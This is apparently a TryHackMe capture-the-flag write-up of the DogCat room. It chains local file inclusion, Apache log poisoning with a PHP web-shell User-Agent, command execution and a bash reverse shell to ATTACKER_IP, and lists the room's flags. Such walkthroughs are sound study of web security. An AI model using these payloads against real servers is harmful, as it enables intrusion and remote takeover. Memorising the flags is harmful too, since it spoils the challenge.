# Hacking DogCat --- TryHackMe Write-up (LFI → Log Poisoning → RCE → Privilege Escalation)

Author: Vinay Trivedi

This write-up documents my exploitation process while solving the DogCat
room on TryHackMe. The box demonstrates how multiple vulnerabilities can
be chained together to achieve full system compromise.

## Attack Chain

Local File Inclusion → Log Poisoning → Remote Code Execution → Privilege
Escalation

------------------------------------------------------------------------

## Initial Enumeration

I started with an Nmap scan to identify open services.

``` bash
nmap -sC -sV -A 10.114.175.115
```

### Results

    PORT   STATE SERVICE VERSION
    22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu
    80/tcp open  http    Apache httpd 2.4.38 (Debian)

Observation: - SSH running on port 22 - Apache web server running on
port 80 - The web application is likely the attack surface

------------------------------------------------------------------------

## Exploring the Web Application

Opening the website displays a page titled **dogcat** with two buttons:

-   A dog
-   A cat

Clicking either button modifies the URL parameter:

    http://TARGET/?view=dog
    http://TARGET/?view=cat

This suggested the application dynamically loads content based on the
**view parameter**, which can lead to file inclusion vulnerabilities.

------------------------------------------------------------------------

## Parameter Fuzzing

I intercepted the request using Burp Suite and sent it to Intruder using
a common wordlist.

One payload produced an interesting response:

Payload:

    _catalogs

Response:

    Warning: include(_catalogs.php): failed to open stream
    in /var/www/html/index.php

This revealed the backend path:

    /var/www/html/index.php

Which suggested the application likely executes:

``` php
include($view . ".php");
```

------------------------------------------------------------------------

## Testing for Local File Inclusion

Next I attempted directory traversal.

Payload:

    ?view=../../../../../etc/dog

Response:

    include(../../../../../etc/dog.php)

Traversal worked, but `.php` was automatically appended.

------------------------------------------------------------------------

## Extension Bypass Discovery

Eventually I noticed another parameter controlling the extension.

Payload:

    http://TARGET/?view=cat../../../../../../etc/passwd&ext=

Result:

    root:x:0:0:root:/root:/bin/bash
    www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin

This confirmed a **Local File Inclusion vulnerability**.

------------------------------------------------------------------------

## LFI Flag

    THM{{LF1_t0_RC3_aec3fb}}

------------------------------------------------------------------------

## Turning LFI into RCE

Apache logs requests in:

    /var/log/apache2/access.log

By injecting PHP code into the **User-Agent header**, it gets written
into the log file.

Injected header:

``` php
User-Agent: <?php system($_GET['c']); ?>
```

When the log is included through LFI, the PHP executes.

------------------------------------------------------------------------

## Command Execution

Example:

    http://TARGET/?view=dog/../../../../../../../../../../../../var/log/apache2/access.log&ext=&c=whoami

Output:

    www-data

This confirmed **Remote Command Execution**.

------------------------------------------------------------------------

## Reverse Shell

Listener:

``` bash
nc -lvnp 4444
```

Payload:

``` bash
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
```

This provided a shell as:

    www-data

------------------------------------------------------------------------

## User Flag

    THM{{Th1s_1s_N0t_4_Catdog_ab67edfa}}

------------------------------------------------------------------------

## Privilege Escalation

Further enumeration revealed environment misconfigurations.

For the remaining escalation steps I referenced:

https://medium.com/@optimus-pryme/hacking-dogcats-tryhackme-ctf-challenge-8958bcfa29c4

------------------------------------------------------------------------

## Additional Flag

    THM{{D1ff3r3nt_3nv1ronments_874112}}

------------------------------------------------------------------------

## Root Flag

    THM{{esc4l4tions_on_esc4l4tions_on_esc4l4tions_7a52b17dba6ebb00dc38bc1049bcba02d}}

------------------------------------------------------------------------

## Exploitation Flow

Parameter Manipulation\
↓\
Local File Inclusion\
↓\
Directory Traversal\
↓\
Log Poisoning\
↓\
Remote Code Execution\
↓\
Privilege Escalation\
↓\
Root Access

------------------------------------------------------------------------

## Key Takeaways

-   Improper use of `include()` can lead to Local File Inclusion.
-   Log poisoning can convert LFI into Remote Code Execution.
-   Enumeration after initial access is critical.
-   Multiple small misconfigurations can lead to full system compromise.

------------------------------------------------------------------------

## Conclusion

DogCat is an excellent room for learning how web vulnerabilities can be
chained together to achieve full system compromise.
